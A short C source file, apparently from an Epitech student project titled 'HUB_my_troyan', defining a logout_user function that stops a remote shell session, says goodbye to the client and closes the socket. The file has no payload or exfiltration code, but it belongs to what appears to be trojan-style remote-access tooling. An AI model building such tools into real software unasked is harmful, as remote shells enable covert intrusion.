/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 logout_user.c
*/

#include "app.h"

void logout_user(server_t *server)
{
    if (server->client_connected) {
        shell_stop(&server->shell);
        send_to_client(&server->client, 1, "[ Goodbye ]\n");
        socket_close(&server->client);
        server->client_connected = false;
    }
}